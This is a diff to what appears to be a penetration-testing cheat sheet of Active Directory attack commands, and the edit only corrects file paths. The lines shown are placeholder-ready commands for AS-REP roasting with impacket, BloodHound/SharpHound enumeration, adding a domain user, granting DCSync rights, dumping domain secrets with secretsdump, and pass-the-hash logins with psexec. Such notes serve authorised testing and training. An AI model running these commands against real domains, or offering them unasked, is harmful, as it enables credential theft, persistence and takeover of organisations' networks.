@@ -664,9 +664,9 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
 
 # Bloodhound
-sudo ./usr/bin/neo4j console                                     # LHOST
-./opt/bloodhound/resources/app/Collectors/SharpHound.exe -c all  # RHOST
-./opt/bloodhound/BloodHound  --no-sandbox                        # LHOST
+sudo /usr/bin/neo4j console                                     # LHOST
+/opt/bloodhound/resources/app/Collectors/SharpHound.exe -c all  # RHOST
+/opt/bloodhound/BloodHound  --no-sandbox                        # LHOST
 
 # Add user
 net user {USERNAME} {PASSWORD} /add /domain
@@ -680,7 +680,7 @@ $cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USERNAME
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC={DOMAIN1},DC={DOMAIN2}" -PrincipalIdentity {USERNAME} -Rights DCSync
 
 # Dump secrets
-sudo python3 ./usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
+sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
 
 # PSEXEC
 sudo python3 psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
